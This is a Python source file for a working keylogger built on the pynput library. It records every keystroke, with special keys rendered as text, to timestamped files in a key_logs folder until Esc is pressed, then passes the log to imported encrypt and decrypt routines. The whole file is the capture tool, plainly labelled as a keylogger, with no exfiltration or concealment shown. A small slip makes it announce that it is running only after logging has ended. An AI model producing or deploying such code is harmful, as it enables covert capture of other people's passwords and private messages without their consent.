from pynput import keyboard
import logging
import os
import time
import threading
import datetime
from encryptor import encrypt_file, decrypt_file    


log_file= None

def setup_logging():
    """Set up the logging configuration."""
    global log_file
    log_dir = "key_logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    log_file = os.path.join(log_dir, f"key_log_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log")
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
    return log_file



def on_press(key):
    """Callback function to handle key press events."""
    global log_file
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                # Handle special keys like space, enter, tab
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.tab:
                    f.write('\t')
                else:
                    f.write(f'[{key}]')
    except Exception as e:
        logging.error(f'Error logging key press: {e}')


def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        return False
   

def start_keylogger():
    """Start the keylogger."""
    log_file = setup_logging()
    logging.info("Keylogger started.")
    
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    logging.info("Keylogger stopped.")
    return log_file






def main():
    """Main function to run the keylogger."""
    try:
        log_file = start_keylogger()
        print(f"Keylogger is running. Logs are being saved to {log_file}")
        encrypt_file(log_file)  
        output_file = log_file + ".decrypted.txt"
        decrypt_file(log_file, output_file)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        print("An error occurred while starting the keylogger.")
    finally:
        print("Keylogger has stopped.")

        
if __name__ == "__main__":
    main()

# This code is a simple keylogger that logs keystrokes to a file.